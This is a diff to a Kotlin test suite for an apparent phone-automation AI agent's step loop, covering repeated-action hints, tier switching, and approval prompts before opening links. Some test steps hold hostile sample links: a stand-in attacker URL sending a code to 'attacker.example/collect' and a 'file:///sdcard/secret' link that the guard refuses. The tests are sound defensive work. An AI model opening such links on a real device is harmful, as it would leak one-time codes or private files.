@@ -20,17 +20,18 @@ class StepLoopTest {
         val lines = CopyOnWriteArrayList<StepLine>()
         val clock = AtomicLong(0)
         val desk = FakeDesk()
-        val runner = ToolRunner(Guard(), gate, desk, { setOf(LAUNCHER) }, { clock.get() }, { delays += it })
+        /** The older tests were written for fewer questions; the careful ones set CAREFUL first. */
+        @Volatile var mode: Caution = Caution.FEWER_QUESTIONS
+        val runner = ToolRunner(Guard(), gate, desk, { setOf(LAUNCHER) }, { clock.get() }, { delays += it }, { mode })
         val loop = StepLoop(brain, MapSkillBook(FOOD_CARDS), runner, { delays += it }, { clock.get() }, maxSteps)
 
         fun run(
             sub: SubTask = SubTask("add a biryani to the cart", Kind.PHONE, "food_delivery", FOOD),
             earlier: List<String> = emptyList(),
             budget: Budget = Budget(60, 600_000, { clock.get() }),
-            task: String = "",
             apps: List<AppInfo> = FAKE_APPS,
         ): StepLoop.Result = runBlocking {
-            loop.run(StepLoop.Input("r1", 0, sub, earlier, driver, Approvals({ clock.get() }), apps, budget, { lines += it }, task = task))
+            loop.run(StepLoop.Input("r1", 0, sub, earlier, driver, Approvals({ clock.get() }), apps, budget, { lines += it }))
         }
     }
 
@@ -109,7 +110,7 @@ class StepLoopTest {
 
     @Test fun anActionThatChangesNothingIsReadThreeTimesBeforeTheLoopMovesOn() {
         val s = Setup()
-        s.brain.reply(step("scroll", direction = "down"), step("done", text = "ok"))
+        s.brain.replyWith(tapLabel("Search"), { step("done", text = "ok") })
         s.run()
         assertEquals(listOf(500L, 500L, 500L), s.delays.toList())
     }
@@ -183,7 +184,7 @@ class StepLoopTest {
 
     @Test fun theSameCallOnTheSameScreenTwiceTellsTheModelAndThirdTimeSwitchesToTheStrongTier() {
         val s = Setup()
-        s.brain.fallback = { _, _ -> step("scroll", direction = "down") }
+        s.brain.fallback = { _, c -> step("tap", id = idOf(c.user, "Search", "edit")) }
         val r = s.run()
         assertEquals(StepLoop.End.FAILED, r.end)
         assertTrue(r.outcome, r.outcome.contains("stopped changing"))
@@ -192,12 +193,12 @@ class StepLoopTest {
         assertFalse(s.brain.calls[0].user.contains("already did this"))
         assertFalse(s.brain.calls[1].user.contains("already did this"))
         assertTrue(s.brain.calls[2].user.contains("already did this on this exact screen"))
-        assertEquals(7, s.driver.actions.count { it.startsWith("scroll") })
+        assertEquals(7, s.driver.actions.count { it == "tap:search" })
     }
 
     @Test fun withoutAStrongTierTheTierStaysFastAndTheSubtaskStillFails() {
         val s = Setup(brain = ScriptedBrain(strong = false))
-        s.brain.fallback = { _, _ -> step("scroll", direction = "down") }
+        s.brain.fallback = { _, c -> step("tap", id = idOf(c.user, "Search", "edit")) }
         val r = s.run()
         assertEquals(StepLoop.End.FAILED, r.end)
         assertTrue(s.brain.calls.all { it.tier == Tier.FAST })
@@ -221,7 +222,7 @@ class StepLoopTest {
     @Test fun anActionThatChangesTheScreenResetsTheHint() {
         val s = Setup()
         s.brain.replyWith(
-            { step("scroll", direction = "down") }, { step("scroll", direction = "down") },
+            tapLabel("Search"), tapLabel("Search"),
             tapLabel("Veg only"), { step("done", text = "ok") },
         )
         s.run()
@@ -293,7 +294,7 @@ class StepLoopTest {
     @Test fun aRefusalIsToldToTheModelAndAGoodStepResetsTheCount() {
         val s = Setup()
         val bad: suspend (ScriptedBrain.Call) -> String = { step("open_link", text = "file:///sdcard/secret") }
-        s.brain.replyWith(bad, bad, { step("scroll", direction = "down") }, bad, bad, { step("done", text = "ok") })
+        s.brain.replyWith(bad, bad, tapLabel("Search"), bad, bad, { step("done", text = "ok") })
         val r = s.run()
         assertEquals(StepLoop.End.DONE, r.end)
         assertTrue(s.driver.links.isEmpty())
@@ -413,21 +414,24 @@ class StepLoopTest {
         assertTrue(s.gate.prompts.single().action.contains("https://attacker.example/collect?code=123456"))
     }
 
-    @Test fun aLinkTheyWroteInTheTaskAndWhoseAppIsApprovedNeedsNoQuestion() {
+    @Test fun r10_everyLinkIsAskedAboutWithTheFullLinkAndTheAppThatOpensItEvenWhenThatAppIsInThePlan() {
+        val uri = "https://food.example/menu?table=12"
         val s = Setup()
         s.driver.linkTargetOf = { FOOD }
-        s.brain.reply(step("open_link", text = "https://food.example/menu"), step("done", text = "ok"))
-        s.run(task = "open https://food.example/menu for me")
-        assertEquals(listOf("https://food.example/menu"), s.driver.links.toList())
-        assertEquals(listOf(FOOD), s.driver.linkPackages.toList())
-        assertTrue(s.gate.prompts.isEmpty())
+        s.brain.reply(step("open_link", text = uri), step("done", text = "ok"))
+        val r = s.run()
+        assertEquals(StepLoop.End.STOPPED, r.end)
+        val p = s.gate.prompts.single()
+        assertEquals(AskKind.LINK, p.kind)
+        assertTrue(p.action, p.action.contains(uri) && p.action.contains("in FakeFood"))
+        assertTrue(s.driver.links.isEmpty())
     }
 
     @Test fun aLinkNoSingleAppOpensIsRefusedAndNothingIsStarted() {
         val s = Setup()
         s.driver.linkTargetOf = { "" }
         s.brain.reply(step("open_link", text = "https://example.com"), step("done", text = "ok"))
-        s.run(task = "https://example.com")
+        s.run()
         assertTrue(s.driver.links.isEmpty())
         assertEquals(Verdict.REFUSED, s.lines[0].verdict)
         assertTrue(s.lines[0].result, s.lines[0].result.contains("no single app opens this link"))
@@ -438,7 +442,7 @@ class StepLoopTest {
         val s = Setup()
         s.driver.linkTargetOf = { "com.example.pay" }
         s.brain.reply(step("open_link", text = "https://example.com"), step("done", text = "ok"))
-        s.run(task = "https://example.com", apps = apps)
+        s.run(apps = apps)
         assertTrue(s.driver.links.isEmpty())
         assertTrue(s.lines[0].result, s.lines[0].result.contains("protected"))
     }
